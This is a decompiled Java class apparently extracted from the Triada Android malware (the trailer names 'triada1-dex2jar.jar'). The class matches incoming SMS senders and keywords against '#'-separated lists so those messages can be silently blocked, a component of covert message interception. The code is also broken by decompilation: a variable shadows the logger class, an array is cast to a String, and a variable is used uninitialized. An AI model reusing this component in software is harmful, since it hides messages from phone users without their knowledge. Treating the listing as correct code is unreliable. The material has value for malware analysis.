package com.android.essdk.eyou.a;

import com.android.essdk.eyou.e.b;

public class c {
  private int a;
  
  private String b;
  
  private String c;
  
  private String d;
  
  private boolean a(String[] paramArrayOfString, String paramString) {
    boolean bool = false;
    int i = paramArrayOfString.length;
    byte b = 0;
    while (true) {
      if (b < i) {
        String str = paramArrayOfString[b];
        b.a("FilterBean", "过滤短信列表  is " + str + " , 过滤 is " + paramString);
        if (paramString != null && str != null && !str.trim().equals("") && (str.indexOf(paramString) != -1 || paramString.indexOf(str) != -1))
          return true; 
        b++;
        continue;
      } 
      return bool;
    } 
  }
  
  public String a() {
    return this.b;
  }
  
  public void a(int paramInt) {
    this.a = paramInt;
  }
  
  public void a(String paramString) {
    this.b = paramString;
  }
  
  public boolean a(String paramString1, String paramString2) {
    String[] arrayOfString;
    if (paramString2 == null || paramString2.trim().equals("")) {
      if (!this.b.contains("#")) {
        arrayOfString = new String[1];
        arrayOfString[0] = this.b.trim();
      } else {
        arrayOfString = this.b.split("#");
      } 
      if (a(arrayOfString, paramString1))
        return true; 
    } else if (this.c != null && !this.c.trim().equals("")) {
      String[] arrayOfString1;
      String[] arrayOfString2;
      b.a("FilterBean", "根据关键字和号码屏蔽" + this.c + " , " + this.b);
      if (!this.b.contains("#")) {
        arrayOfString1 = new String[1];
        arrayOfString1[0] = this.b.trim();
      } else {
        arrayOfString1 = this.b.split("#");
      } 
      if (!this.c.contains("#")) {
        arrayOfString2 = new String[1];
        arrayOfString2[0] = this.c.trim();
      } else {
        arrayOfString2 = this.c.split("#");
      } 
      if (a(arrayOfString1, paramString1) && a(arrayOfString2, (String)arrayOfString))
        return true; 
    } else {
      b.a("FilterBean", "根据号码屏蔽" + this.c + " , " + this.b);
      if (!this.b.contains("#")) {
        arrayOfString = new String[1];
        arrayOfString[0] = this.b.trim();
      } else {
        arrayOfString = this.b.split("#");
      } 
      if (a(arrayOfString, paramString1))
        return true; 
    } 
    return false;
  }
  
  public String b() {
    return this.c;
  }
  
  public void b(String paramString) {
    this.c = paramString;
  }
  
  public void c(String paramString) {
    this.d = paramString;
  }
}


/* Location:              /home/fahim/Desktop/triada1-dex2jar.jar!/com/android/essdk/eyou/a/c.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       1.1.3
 */